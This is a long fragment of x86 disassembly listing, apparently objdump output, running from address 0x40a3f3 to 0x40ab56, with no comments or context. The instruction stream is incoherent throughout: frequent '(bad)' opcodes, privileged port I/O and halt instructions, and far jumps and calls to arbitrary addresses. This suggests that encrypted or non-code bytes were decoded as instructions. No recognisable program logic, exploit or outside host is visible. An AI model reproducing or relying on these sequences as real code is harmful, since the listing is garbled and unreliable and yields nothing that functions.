  40a3f3:	jle    0x40a381
  40a3f5:	push   ss
  40a3f6:	stc    
  40a3f7:	pop    ebx
  40a3f8:	sbb    cl,BYTE PTR [ebx+0xda564ee]
  40a3fe:	xlat   BYTE PTR ds:[ebx]
  40a3ff:	fadd   st,st(0)
  40a401:	shr    BYTE PTR [ebx+0x67],0xa8
  40a405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a406:	mov    ds:0xe0c3edef,al
  40a40b:	jmp    0x40a40d
  40a40d:	ss dec ebp
  40a40f:	lea    eax,[eax-0x5]
  40a412:	mov    edx,0x835f262a
  40a417:	xchg   dh,dl
  40a419:	adc    BYTE PTR [ebx-0x35f1c5e9],dh
  40a41f:	fld    DWORD PTR [ebx]
  40a421:	pop    edi
  40a422:	jmp    0xf97f:0x1476cdc
  40a429:	dec    edx
  40a42a:	lods   eax,DWORD PTR ds:[esi]
  40a42b:	mov    bh,0xaf
  40a42d:	nop
  40a42e:	inc    ebp
  40a42f:	(bad)  
  40a430:	sub    ebp,DWORD PTR ds:0x5ccbec2c
  40a436:	or     dh,BYTE PTR [edi+0x57]
  40a439:	pop    eax
  40a43a:	popa   
  40a43b:	sbb    dh,ch
  40a43d:	xor    edi,eax
  40a43f:	and    BYTE PTR [ebx-0x1f30a4af],0x28
  40a446:	sbb    eax,0x3aedd975
  40a44b:	lods   eax,DWORD PTR ds:[esi]
  40a44c:	pushf  
  40a44d:	or     eax,0xac145755
  40a452:	sub    BYTE PTR [ebx-0x1097cf5e],ah
  40a458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a459:	inc    edx
  40a45a:	cmp    al,0x31
  40a45c:	sbb    ebx,0x57e5b16e
  40a462:	mov    ebx,0x6ef129dd
  40a467:	ret    0x6647
  40a46a:	adc    BYTE PTR [ebx+0xa78843c],ch
  40a470:	sbb    ch,BYTE PTR [esi-0x14]
  40a473:	js     0x40a472
  40a475:	and    bh,BYTE PTR [edx-0x56]
  40a478:	pop    es
  40a479:	push   0xcd38e3e5
  40a47e:	pushf  
  40a47f:	push   ds
  40a480:	fld    DWORD PTR [esi+0x5d]
  40a483:	in     eax,dx
  40a484:	shl    DWORD PTR [edx+ebp*1-0x39],cl
  40a488:	hlt    
  40a489:	push   ebp
  40a48a:	sub    bl,BYTE PTR [edi]
  40a48c:	int3   
  40a48d:	pop    edx
  40a48e:	jns    0x40a41d
  40a490:	sub    BYTE PTR [edx-0x3],bl
  40a493:	dec    esp
  40a494:	jecxz  0x40a46c
  40a496:	mov    ecx,DWORD PTR [eax]
  40a498:	mov    edx,0x6d62a187
  40a49d:	jg     0x40a43b
  40a49f:	jne    0x40a474
  40a4a1:	inc    esi
  40a4a2:	cli    
  40a4a3:	mov    ah,0xce
  40a4a5:	pusha  
  40a4a6:	cld    
  40a4a7:	fsubp  st(0),st
  40a4a9:	push   eax
  40a4aa:	xor    al,0x25
  40a4ac:	scas   eax,DWORD PTR es:[edi]
  40a4ad:	adc    esi,DWORD PTR [ebp+0x318effa4]
  40a4b3:	dec    edi
  40a4b4:	mov    eax,ds:0x8f70f5b6
  40a4b9:	cmp    BYTE PTR [edi],0xac
  40a4bc:	add    bl,BYTE PTR [edx-0x51]
  40a4bf:	js     0x40a46d
  40a4c1:	test   al,0x49
  40a4c3:	fstp   DWORD PTR ds:0x4a37afc6
  40a4c9:	xlat   BYTE PTR ds:[ebx]
  40a4ca:	sbb    eax,0xfd2a68cd
  40a4cf:	sub    eax,0x4b0a4a6b
  40a4d4:	jge    0x40a501
  40a4d6:	imul   ebx,DWORD PTR [ecx+ebx*2-0x31955ecf],0x79e30917
  40a4e1:	add    al,0xe3
  40a4e3:	add    edx,DWORD PTR [edx+0x2101ad8a]
  40a4e9:	aas    
  40a4ea:	pop    edi
  40a4eb:	call   0xa319:0x6a851763
  40a4f2:	inc    ebx
  40a4f3:	mov    ch,0x35
  40a4f5:	jns    0x40a4d2
  40a4f7:	loop   0x40a522
  40a4f9:	dec    ebp
  40a4fa:	ror    WORD PTR [edi-0x7e],1
  40a4fe:	mov    esp,0x704333eb
  40a503:	or     ecx,DWORD PTR [ebx+0x18]
  40a506:	jne    0x40a538
  40a508:	gs lock pop ds
  40a50b:	cmp    edx,0xffffffa0
  40a50e:	adc    al,0xdf
  40a510:	fsub   DWORD PTR [edi+0x5]
  40a513:	aam    0x6b
  40a515:	addr16 dec ecx
  40a517:	aam    0xef
  40a519:	pop    es
  40a51a:	aam    0xc9
  40a51c:	out    dx,eax
  40a51d:	push   ss
  40a51e:	pop    esp
  40a51f:	sub    eax,0x41c0fdac
  40a524:	inc    edi
  40a525:	mov    ebp,DWORD PTR [edi-0x72441353]
  40a52b:	dec    ecx
  40a52c:	lds    edi,FWORD PTR [edx]
  40a52e:	sbb    al,0x2f
  40a530:	adc    BYTE PTR [ecx+ecx*8],cl
  40a533:	or     BYTE PTR [edi+0x7e],0x29
  40a537:	and    al,0x50
  40a539:	push   ss
  40a53a:	mov    bl,0x61
  40a53c:	test   BYTE PTR [edi-0x4f],bl
  40a53f:	aam    0x37
  40a541:	xlat   BYTE PTR ds:[ebx]
  40a542:	sub    dh,cl
  40a544:	dec    eax
  40a545:	sub    al,0x1c
  40a547:	inc    edx
  40a548:	loopne 0x40a52f
  40a54a:	outs   dx,BYTE PTR ds:[esi]
  40a54b:	and    BYTE PTR [ebp+edi*4+0x73],dl
  40a54f:	pop    esi
  40a550:	inc    ebx
  40a551:	xchg   BYTE PTR [eax],al
  40a553:	(bad)  
  40a554:	sub    BYTE PTR [ebx-0x55],cl
  40a557:	in     al,dx
  40a558:	ror    ebx,cl
  40a55a:	fwait
  40a55b:	(bad)  
  40a55c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a55d:	and    ebp,DWORD PTR [ebp+0x21]
  40a560:	cmp    eax,0x4f74f893
  40a565:	mov    ebx,0x36c86cc3
  40a56a:	sub    al,0x21
  40a56c:	jp     0x40a5b8
  40a56e:	adc    ebx,DWORD PTR [esi+0x37899b99]
  40a574:	mov    dh,0xb7
  40a576:	xchg   ebx,eax
  40a577:	cmp    edx,DWORD PTR [ecx]
  40a579:	test   DWORD PTR ds:0xb7328bd7,esi
  40a57f:	xor    eax,0x7b00bdcd
  40a584:	mov    ebp,0x538ef0aa
  40a589:	mov    bh,0xe2
  40a58b:	test   eax,0x1796ac4d
  40a590:	jmp    DWORD PTR [esi]
  40a592:	sub    BYTE PTR [edi+ebp*1-0x37],bl
  40a596:	daa    
  40a597:	sahf   
  40a598:	mov    ecx,cs
  40a59a:	imul   ebp,ebp,0xffffffda
  40a59d:	and    BYTE PTR [edi-0x3558a0c9],ah
  40a5a3:	repnz xchg esp,eax
  40a5a5:	dec    edx
  40a5a6:	and    BYTE PTR [eax-0x5d],dh
  40a5a9:	lods   eax,DWORD PTR ds:[esi]
  40a5aa:	int    0xde
  40a5ac:	aad    0x0
  40a5ae:	mov    ah,0x57
  40a5b0:	rcr    BYTE PTR [edi+esi*8+0x586f2d34],0x76
  40a5b8:	sahf   
  40a5b9:	mov    bl,0xc7
  40a5bb:	adc    ebp,eax
  40a5bd:	and    BYTE PTR [esi],al
  40a5bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5c0:	inc    edx
  40a5c1:	adc    DWORD PTR [eax],0x8
  40a5c4:	int    0xd7
  40a5c6:	and    eax,0x379d7e6d
  40a5cb:	mov    bl,BYTE PTR [ebx]
  40a5cd:	arpl   WORD PTR [eax-0x2c82dc6],ax
  40a5d3:	out    0xf7,eax
  40a5d5:	pop    ebx
  40a5d6:	fnstsw WORD PTR [edx-0x1c]
  40a5d9:	push   cs
  40a5da:	adc    al,0xbf
  40a5dc:	mov    bl,0x84
  40a5de:	(bad)  
  40a5df:	cmp    al,0xf2
  40a5e1:	clc    
  40a5e2:	enter  0x8223,0x5f
  40a5e6:	out    0x4c,al
  40a5e8:	(bad)  
  40a5e9:	cmp    BYTE PTR [esi+0x1edb16df],ch
  40a5ef:	or     DWORD PTR [eax],esp
  40a5f1:	jmp    0x40a625
  40a5f3:	xchg   ebp,eax
  40a5f4:	push   ebx
  40a5f5:	mov    WORD PTR [eax],?
  40a5f7:	fldcw  WORD PTR [edx+0x329792ef]
  40a5fd:	mov    BYTE PTR gs:[ebx+0x5fd8683d],bl
  40a604:	and    al,0x52
  40a606:	retf   
  40a607:	pop    ebx
  40a608:	jl     0x40a5f3
  40a60a:	mul    BYTE PTR [ebx+edx*2-0x6d0edda]
  40a611:	pop    edx
  40a612:	xor    ecx,DWORD PTR [esi+ebx*2+0x0]
  40a616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a617:	in     eax,0x7
  40a619:	es test ah,cl
  40a61c:	cmp    ah,BYTE PTR [esi]
  40a61e:	imul   esi,eax,0xdbfa7436
  40a624:	nop
  40a625:	pushf  
  40a626:	add    eax,0x2cbb3cd
  40a62b:	inc    ebp
  40a62c:	or     cl,ch
  40a62e:	inc    ebx
  40a62f:	cdq    
  40a630:	mov    bl,0xfb
  40a632:	mov    edi,0x54816902
  40a637:	and    dl,al
  40a639:	cmp    dl,ah
  40a63b:	fcom   DWORD PTR [bp+di+0x72]
  40a63f:	sbb    eax,0x2219776e
  40a644:	data16 cmp BYTE PTR [esi],ch
  40a647:	inc    edi
  40a648:	and    edi,DWORD PTR [edx+0x2c419b5a]
  40a64e:	jno    0x40a694
  40a650:	cli    
  40a651:	iret   
  40a652:	jae    0x40a602
  40a654:	call   0x11a0b27f
  40a659:	jg     0x40a6c6
  40a65b:	inc    ebx
  40a65c:	jae    0x40a5e9
  40a65e:	in     al,0x77
  40a660:	mov    BYTE PTR [eax-0x6c980cbd],dl
  40a666:	into   
  40a667:	and    edi,DWORD PTR [ebp+0xf09c8ef]
  40a66d:	jns    0x40a6aa
  40a66f:	sbb    bl,bh
  40a671:	adc    eax,DWORD PTR [ebx-0x655d6a8f]
  40a677:	icebp  
  40a678:	jne    0x40a675
  40a67a:	and    BYTE PTR [ecx+0x12c012fd],al
  40a680:	adc    BYTE PTR [ebp-0x56f7944a],dh
  40a686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a687:	je     0x40a6c3
  40a689:	cmp    BYTE PTR [edx-0x9],cl
  40a68c:	iret   
  40a68d:	(bad)  
  40a68e:	shl    BYTE PTR [esi+0x1ef04679],1
  40a694:	or     eax,0x9adbf793
  40a699:	or     eax,0xe1c672f5
  40a69e:	adc    BYTE PTR [ecx],dh
  40a6a0:	(bad)
  40a6a4:	sub    al,0x2a
  40a6a6:	push   ss
  40a6a7:	and    al,0xef
  40a6a9:	jg     0x40a6d6
  40a6ab:	adc    eax,DWORD PTR [ebx-0x5ee1f383]
  40a6b1:	pop    ds
  40a6b2:	jecxz  0x40a654
  40a6b4:	out    dx,eax
  40a6b5:	jbe    0x40a63b
  40a6b7:	bound  esi,QWORD PTR [eax+0x13]
  40a6ba:	inc    ecx
  40a6bb:	pop    edi
  40a6bc:	xchg   ebx,eax
  40a6bd:	mov    ecx,ss
  40a6bf:	inc    eax
  40a6c0:	cmc    
  40a6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6c2:	push   cs
  40a6c3:	xchg   ecx,eax
  40a6c4:	and    eax,DWORD PTR [edx+0x5c481f65]
  40a6ca:	push   edi
  40a6cb:	cmp    DWORD PTR [ecx-0x67],ebx
  40a6ce:	fst    DWORD PTR [ebx]
  40a6d0:	dec    esi
  40a6d1:	dec    edi
  40a6d2:	add    al,0xf0
  40a6d4:	mov    dh,0x4b
  40a6d6:	cmp    BYTE PTR [ebx+0x1594b03c],bh
  40a6dc:	jp     0x40a683
  40a6de:	out    dx,eax
  40a6df:	cli    
  40a6e0:	lods   al,BYTE PTR cs:[esi]
  40a6e2:	call   0x87cf:0x407406f7
  40a6e9:	mov    ch,0xcc
  40a6eb:	(bad)  
  40a6ec:	(bad)  
  40a6ed:	(bad)  
  40a6ee:	in     eax,0x8b
  40a6f0:	adc    dh,ch
  40a6f2:	jbe    0x40a6cd
  40a6f4:	mov    edi,0xc391df88
  40a6f9:	inc    ebx
  40a6fa:	dec    edi
  40a6fb:	dec    edi
  40a6fc:	jnp    0x40a68c
  40a6fe:	mov    ds:0xc4a57c2b,eax
  40a703:	mov    ebx,0xb4f2ebdf
  40a708:	jae    0x40a6a0
  40a70a:	mov    WORD PTR [ecx],gs
  40a70c:	mov    ds:0x176d572,eax
  40a711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a712:	and    ebp,edx
  40a714:	loopne 0x40a6d5
  40a716:	and    DWORD PTR [ebp-0x5a2deb7e],ecx
  40a71c:	cmc    
  40a71d:	es add ah,bh
  40a720:	mov    WORD PTR [esp+esi*8],ss
  40a723:	or     eax,0x1b7d4961
  40a728:	pop    edi
  40a729:	test   BYTE PTR [ecx+0x69b8fc],0xa9
  40a730:	cwde   
  40a731:	aas    
  40a732:	iret   
  40a733:	mov    DWORD PTR es:[edx],0x6d26e6b6
  40a73a:	xor    bh,BYTE PTR [esi+0x68]
  40a73d:	sub    esi,ebp
  40a73f:	mov    cs,WORD PTR [eax-0x64]
  40a742:	jp     0x40a745
  40a744:	ss push ebp
  40a746:	(bad)  [edx-0x1d]
  40a749:	into   
  40a74a:	rol    esp,0xe
  40a74d:	pop    esi
  40a74e:	xchg   ebx,eax
  40a74f:	popa   
  40a750:	ja     0x40a6fd
  40a752:	sbb    ebx,DWORD PTR [edi-0x6b90e453]
  40a758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a759:	and    DWORD PTR gs:[ebp-0x17],ebx
  40a75d:	rcr    BYTE PTR [ebp-0x41017dac],cl
  40a763:	jb     0x40a7ae
  40a765:	or     al,0xe1
  40a767:	jecxz  0x40a721
  40a769:	add    esi,ebp
  40a76b:	ror    BYTE PTR [ecx-0x73],cl
  40a76e:	inc    ebp
  40a76f:	sbb    DWORD PTR [edi],esi
  40a771:	leave  
  40a772:	fstp   DWORD PTR [ebx-0x1f]
  40a775:	mov    al,0x19
  40a777:	call   0x1edb2761
  40a77c:	(bad)  
  40a77e:	lea    eax,[esi+ebx*4+0x3dd400d0]
  40a785:	sub    BYTE PTR [ecx],bh
  40a787:	fwait
  40a788:	adc    al,0x77
  40a78a:	dec    esi
  40a78b:	sub    al,0x95
  40a78d:	xlat   BYTE PTR ds:[ebx]
  40a78e:	inc    BYTE PTR [ebp-0x42cd5514]
  40a794:	scas   eax,DWORD PTR es:[edi]
  40a795:	cmp    eax,0x9bbfa1b
  40a79a:	test   DWORD PTR [ecx+0xc],ecx
  40a79d:	or     al,0xb2
  40a79f:	sbb    al,0x2e
  40a7a1:	test   al,0x8
  40a7a3:	or     al,0x92
  40a7a5:	inc    ebp
  40a7a6:	cwde   
  40a7a7:	push   edx
  40a7a8:	jb     0x40a75c
  40a7aa:	mov    ebx,0x4f7b76a8
  40a7af:	xlat   BYTE PTR ds:[ebx]
  40a7b0:	into   
  40a7b1:	push   ebp
  40a7b2:	int3   
  40a7b3:	cdq    
  40a7b4:	cmp    ch,dl
  40a7b6:	fcmovnbe st,st(1)
  40a7b8:	mov    al,0x9d
  40a7ba:	mov    ebx,0x50d5e1b6
  40a7bf:	mov    al,fs:0x573634f1
  40a7c5:	inc    ebx
  40a7c6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40a7c8:	and    DWORD PTR [edx+edx*2],edi
  40a7cb:	and    ecx,DWORD PTR ds:0xf9120b04
  40a7d1:	sar    DWORD PTR [ebp-0x1d],1
  40a7d4:	shl    DWORD PTR [ecx+0x2a],0x1c
  40a7d8:	jbe    0x40a7a7
  40a7da:	jmp    0xcd1b66a2
  40a7df:	jne    0x40a81f
  40a7e1:	sub    ch,BYTE PTR [eax-0x1bf740b5]
  40a7e7:	fmulp  st(1),st
  40a7e9:	retf   
  40a7ea:	out    0xbb,al
  40a7ec:	xchg   edi,eax
  40a7ed:	sar    DWORD PTR [ecx+0x56c2f098],1
  40a7f3:	std    
  40a7f4:	test   BYTE PTR [esi+0x294cbee0],ah
  40a7fa:	push   edx
  40a7fb:	pop    esp
  40a7fc:	(bad)  
  40a7fd:	fcmovnu st,st(5)
  40a7ff:	mov    cl,0xb0
  40a801:	sub    eax,0x8de3bf3a
  40a806:	popf   
  40a807:	mov    eax,DWORD PTR [esi-0x59]
  40a80a:	enter  0xef22,0xe5
  40a80e:	mov    al,0xe2
  40a810:	xor    eax,0x5ce69b2b
  40a815:	pop    ss
  40a816:	ret    0x7ddf
  40a819:	dec    edi
  40a81a:	enter  0xf72d,0x6e
  40a81e:	and    esp,DWORD PTR [ebp+0x6655578b]
  40a824:	pop    es
  40a825:	push   ss
  40a826:	out    0x2a,eax
  40a828:	fs push ss
  40a82a:	sbb    al,0x9f
  40a82c:	cmp    eax,0x2efaf310
  40a831:	jbe    0x40a879
  40a833:	inc    esi
  40a834:	pushf  
  40a835:	add    eax,DWORD PTR [edx+0x3b3b33f1]
  40a83b:	sbb    edi,ebx
  40a83d:	daa    
  40a83e:	pop    ecx
  40a83f:	test   esp,ebx
  40a841:	jg     0x40a7f0
  40a843:	pop    edx
  40a844:	gs out dx,al
  40a846:	xchg   esi,eax
  40a847:	mov    ebx,0x437465dd
  40a84c:	xor    bl,BYTE PTR [eax]
  40a84e:	cmp    BYTE PTR [eax+ebx*8-0x2b],ch
  40a852:	adc    esp,DWORD PTR [ebx+0x4f]
  40a855:	xlat   BYTE PTR ds:[ebx]
  40a856:	push   edx
  40a857:	icebp  
  40a858:	cld    
  40a859:	xchg   ebx,eax
  40a85a:	sbb    eax,0x4e01e0a9
  40a85f:	jle    0x40a7e2
  40a861:	jmp    0x40a8b6
  40a863:	jecxz  0x40a82b
  40a865:	mov    edx,DWORD PTR [ebx+0x3893f090]
  40a86b:	xchg   edx,eax
  40a86c:	lahf   
  40a86d:	pop    es
  40a86e:	xchg   edi,eax
  40a86f:	xchg   esp,eax
  40a870:	dec    eax
  40a871:	in     eax,0xaa
  40a873:	jo     0x40a824
  40a875:	xor    al,0x97
  40a877:	lea    eax,[ecx-0x48342f2]
  40a87d:	and    al,0xae
  40a87f:	mov    ebp,0x53e08253
  40a884:	cmc    
  40a885:	adc    eax,0x6a67e71
  40a88a:	les    eax,FWORD PTR [edx-0x11]
  40a88d:	rol    BYTE PTR [edi-0x44331b12],0x32
  40a894:	fadd   DWORD PTR [esi+0x0]
  40a897:	gs cwde 
  40a899:	adc    DWORD PTR [esi-0x60],edi
  40a89c:	add    ch,BYTE PTR [esi]
  40a89e:	pop    edx
  40a89f:	js     0x40a8a5
  40a8a1:	mov    ebp,0x6833b2e7
  40a8a6:	fwait
  40a8a7:	inc    eax
  40a8a8:	out    dx,eax
  40a8a9:	cmp    edi,edx
  40a8ab:	add    ch,BYTE PTR cs:[eax+0x35]
  40a8af:	jg     0x40a831
  40a8b1:	or     eax,0xb678495c
  40a8b6:	dec    ebx
  40a8b7:	gs push esp
  40a8b9:	mov    ebp,DWORD PTR [ebp+0xd]
  40a8bc:	scas   al,BYTE PTR es:[edi]
  40a8bd:	jmp    0x9700:0x66f56cd6
  40a8c4:	jge    0x40a84f
  40a8c6:	xor    BYTE PTR [ecx+ebp*8],ch
  40a8c9:	pop    ebp
  40a8ca:	mov    bl,0x8b
  40a8cc:	xor    eax,0xd8e9ff30
  40a8d1:	cld    
  40a8d2:	and    bl,BYTE PTR [ebp-0x69c382c0]
  40a8d8:	mov    edi,0x6c5ce6b0
  40a8dd:	inc    edi
  40a8de:	pop    ecx
  40a8df:	cmc    
  40a8e0:	cmp    BYTE PTR [ebp-0x3f],ch
  40a8e3:	push   edi
  40a8e4:	jl     0x40a90c
  40a8e6:	enter  0xdc0a,0xfa
  40a8ea:	or     DWORD PTR [ebp-0x4233c0d9],edx
  40a8f0:	push   eax
  40a8f1:	int    0x94
  40a8f3:	push   ss
  40a8f4:	std    
  40a8f5:	leave  
  40a8f6:	aam    0xb2
  40a8f8:	imul   eax,DWORD PTR [ebx],0x19
  40a8fb:	pushf  
  40a8fc:	sti    
  40a8fd:	mov    edi,DWORD PTR [eax]
  40a8ff:	adc    eax,DWORD PTR [esi]
  40a901:	xor    ecx,DWORD PTR [esi+0x6a18531e]
  40a907:	out    0xd2,al
  40a909:	imul   edx,DWORD PTR [ecx-0x6915a2c2],0x53
  40a910:	cmp    al,BYTE PTR ds:0xe122bad0
  40a916:	mov    ch,0x53
  40a918:	add    DWORD PTR [si-0x34],esp
  40a91c:	call   0x181149d1
  40a921:	aam    0x9a
  40a923:	stos   DWORD PTR es:[edi],eax
  40a924:	(bad)  
  40a925:	out    dx,eax
  40a926:	loopne 0x40a8dd
  40a928:	or     al,0x5d
  40a92a:	lea    esi,[edx]
  40a92c:	mov    dl,0x55
  40a92e:	jbe    0x40a980
  40a930:	(bad)  
  40a931:	out    0xa0,al
  40a933:	adc    eax,0x701f73e7
  40a938:	xchg   ebp,eax
  40a939:	jno    0x40a8c9
  40a93b:	mov    esp,0xb100f6b3
  40a940:	sub    BYTE PTR [edi+0x5f],bl
  40a943:	inc    eax
  40a944:	shr    BYTE PTR [edi-0x10],0x2a
  40a948:	pop    ebp
  40a949:	xor    dh,BYTE PTR [edi-0x31]
  40a94c:	push   eax
  40a94d:	jnp    0x40a926
  40a94f:	jbe    0x40a9b3
  40a951:	sbb    edx,DWORD PTR [edi+0x113c26ef]
  40a957:	adc    ebx,ebp
  40a959:	xchg   DWORD PTR [ecx+0x53d6c0fc],ebx
  40a95f:	mov    esi,0x65d9ebb6
  40a964:	mov    al,ds:0x63278fd8
  40a969:	mov    ah,0x8d
  40a96b:	outs   dx,BYTE PTR ds:[esi]
  40a96c:	xchg   ebx,eax
  40a96d:	hlt    
  40a96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a96f:	in     al,dx
  40a970:	cs mov ecx,0x7df656de
  40a976:	mov    bl,0x23
  40a978:	jp     0x40a909
  40a97a:	or     bl,dh
  40a97c:	dec    edx
  40a97d:	fsub   DWORD PTR [ecx]
  40a97f:	mov    cs,WORD PTR [ebx]
  40a981:	cld    
  40a982:	sar    ah,0x9a
  40a985:	out    0xa9,al
  40a987:	dec    ebx
  40a988:	add    eax,DWORD PTR [ecx+esi*2-0xb]
  40a98c:	aam    0x6e
  40a98e:	add    ebp,ecx
  40a990:	scas   al,BYTE PTR es:[edi]
  40a991:	sbb    edx,DWORD PTR [edx+eiz*4]
  40a994:	neg    DWORD PTR [edx]
  40a996:	fstp   QWORD PTR [esi+eiz*8+0x1ae4302f]
  40a99d:	lods   al,BYTE PTR ds:[esi]
  40a99e:	push   edi
  40a99f:	sti    
  40a9a0:	mov    edx,0x724735bb
  40a9a5:	add    bl,BYTE PTR [edx+0x21]
  40a9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a9:	iret   
  40a9aa:	pop    ebx
  40a9ab:	jecxz  0x40a9af
  40a9ad:	ins    BYTE PTR es:[edi],dx
  40a9ae:	pop    ebx
  40a9af:	stos   DWORD PTR es:[edi],eax
  40a9b0:	sub    ecx,DWORD PTR [ebp-0x71c08af7]
  40a9b6:	jne    0x40aa03
  40a9b8:	std    
  40a9b9:	jg     0x40a9f6
  40a9bb:	adc    eax,0x2f0ba022
  40a9c0:	inc    esi
  40a9c1:	sbb    esp,DWORD PTR [edx-0x1fa2c147]
  40a9c7:	scas   eax,DWORD PTR es:[edi]
  40a9c8:	leave  
  40a9c9:	lods   eax,DWORD PTR ds:[esi]
  40a9ca:	xlat   BYTE PTR ds:[ebx]
  40a9cb:	lods   al,BYTE PTR ds:[esi]
  40a9cc:	sbb    eax,0x1d02127e
  40a9d1:	mov    dl,0x43
  40a9d3:	jmp    0xcce3:0x9dc49647
  40a9da:	xchg   esp,eax
  40a9db:	(bad)  
  40a9dd:	push   eax
  40a9de:	mov    eax,0x86434849
  40a9e3:	cmp    DWORD PTR [edi],eax
  40a9e5:	in     al,0x67
  40a9e7:	lods   al,BYTE PTR ds:[esi]
  40a9e8:	lock div DWORD PTR [ecx]
  40a9eb:	and    eax,0x9f0c6cb3
  40a9f0:	mov    cl,0x9d
  40a9f2:	sub    eax,0x83ce1cb6
  40a9f7:	retf   0x2ab3
  40a9fa:	aam    0x28
  40a9fc:	sub    eax,0x9fc251a
  40aa01:	int3   
  40aa02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa03:	enter  0x82e3,0x25
  40aa07:	adc    eax,0xe7d144aa
  40aa0c:	pop    edx
  40aa0d:	sub    eax,0x49f66cc6
  40aa12:	retf   
  40aa13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa14:	or     eax,DWORD PTR [ecx-0x3aaa3260]
  40aa1a:	icebp  
  40aa1b:	arpl   sp,cx
  40aa1d:	int3   
  40aa1e:	dec    ebx
  40aa1f:	xchg   BYTE PTR [eax],dh
  40aa21:	les    edx,FWORD PTR [ebx]
  40aa23:	int    0x8e
  40aa25:	call   0xec573922
  40aa2a:	fcom   QWORD PTR [edx+0x368ce719]
  40aa30:	inc    edx
  40aa31:	in     al,0x23
  40aa33:	add    al,0xce
  40aa35:	and    al,0xac
  40aa37:	(bad)  
  40aa38:	jcxz   0x40a9c7
  40aa3b:	add    al,0x7b
  40aa3d:	loop   0x40aa84
  40aa3f:	in     eax,0x78
  40aa41:	rcr    DWORD PTR [ecx+0x35],cl
  40aa44:	cli    
  40aa45:	lahf   
  40aa46:	(bad)  
  40aa48:	mov    cl,0x90
  40aa4a:	ret    
  40aa4b:	stos   BYTE PTR es:[edi],al
  40aa4c:	xchg   ecx,eax
  40aa4d:	dec    esi
  40aa4e:	dec    edi
  40aa4f:	mul    DWORD PTR [eax]
  40aa51:	adc    cl,dl
  40aa53:	and    eax,0x5803227
  40aa58:	xchg   DWORD PTR [ecx],eax
  40aa5a:	jecxz  0x40aabd
  40aa5c:	sub    ch,ch
  40aa5e:	inc    edi
  40aa5f:	loope  0x40aa49
  40aa61:	shl    al,1
  40aa63:	mov    bl,BYTE PTR [ecx+0x65101994]
  40aa69:	test   dl,bh
  40aa6b:	push   edi
  40aa6c:	cmp    edx,ebx
  40aa6e:	or     BYTE PTR [eax],bl
  40aa70:	jns    0x40aa17
  40aa72:	dec    esp
  40aa73:	xlat   BYTE PTR ds:[ebx]
  40aa74:	mov    bl,0x46
  40aa76:	push   ss
  40aa77:	std    
  40aa78:	sti    
  40aa79:	mov    ecx,0x5fa1dbe6
  40aa7e:	jmp    0xbdd6:0x4bf901e
  40aa85:	sub    ah,BYTE PTR [ebx]
  40aa87:	std    
  40aa88:	xchg   esp,eax
  40aa89:	xor    esp,DWORD PTR [ebx+0xe5fb0b7]
  40aa8f:	xchg   edi,eax
  40aa90:	punpcklwd mm0,mm2
  40aa93:	(bad)  
  40aa94:	adc    ebp,esp
  40aa96:	lea    eax,[edi-0x6e0a200c]
  40aa9c:	mov    esi,0x5d8a6822
  40aaa1:	enter  0x4c4e,0x6d
  40aaa5:	mov    edx,0xaa0c7a85
  40aaaa:	fstsw  WORD PTR [edx]
  40aaad:	cs push cs
  40aaaf:	out    0x15,eax
  40aab1:	scas   eax,DWORD PTR es:[edi]
  40aab2:	int3   
  40aab3:	mov    ebp,0x825528b2
  40aab8:	mov    ecx,0xf5318c51
  40aabd:	pop    edi
  40aabe:	or     DWORD PTR [ecx+eax*2],0xfffffffc
  40aac2:	dec    ebx
  40aac3:	jmp    0x2ced:0xd557e2c0
  40aaca:	leave  
  40aacb:	cld    
  40aacc:	mov    esp,0x626323f7
  40aad1:	(bad)  [ebp+0x51]
  40aad4:	es lahf 
  40aad6:	xchg   ecx,eax
  40aad7:	xor    dh,ah
  40aad9:	mov    ds:0x979266b0,eax
  40aade:	adc    ecx,DWORD PTR [edx+0x8]
  40aae1:	in     al,dx
  40aae2:	mov    esp,0x558f2230
  40aae7:	int    0x3d
  40aae9:	pop    ss
  40aaea:	leave  
  40aaeb:	sahf   
  40aaec:	(bad)  [edx-0x7e]
  40aaef:	push   esp
  40aaf0:	popa   
  40aaf1:	(bad)  
  40aaf2:	sbb    ecx,DWORD PTR [edx-0x56850dd7]
  40aaf8:	imul   esp,edx,0x1c515b40
  40aafe:	push   eax
  40aaff:	pop    edx
  40ab00:	pop    ss
  40ab01:	pop    edx
  40ab02:	ret    0x2e12
  40ab05:	sub    BYTE PTR [edx],0x66
  40ab08:	pushf  
  40ab09:	pop    ebx
  40ab0a:	add    esi,DWORD PTR [ecx+0x6f007723]
  40ab10:	clc    
  40ab11:	lea    ecx,[ebp-0x5038b09f]
  40ab17:	dec    esi
  40ab18:	loope  0x40aad1
  40ab1a:	fist   DWORD PTR [esi-0xb]
  40ab1d:	add    eax,0x40d06804
  40ab22:	jge    0x40ab00
  40ab24:	mov    WORD PTR [esi+0x56d4dc52],ds
  40ab2a:	xchg   esp,eax
  40ab2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab2c:	sub    al,0x2c
  40ab2e:	sbb    eax,0x8200204c
  40ab33:	lahf   
  40ab34:	(bad)  
  40ab35:	cli    
  40ab36:	das    
  40ab37:	les    esi,FWORD PTR [ecx]
  40ab39:	scas   eax,DWORD PTR es:[edi]
  40ab3a:	int    0xed
  40ab3c:	out    dx,eax
  40ab3d:	jle    0x40ab70
  40ab3f:	loop   0x40ab5a
  40ab41:	mov    ds:0xd089189e,eax
  40ab46:	dec    eax
  40ab47:	aam    0xdf
  40ab49:	ins    BYTE PTR es:[edi],dx
  40ab4a:	fimul  DWORD PTR [ecx+0x7f]
  40ab4d:	inc    edx
  40ab4e:	imul   edx,DWORD PTR [eax+0x36],0xde4000b4
  40ab55:	das    
  40ab56:	jne    0x40ab43
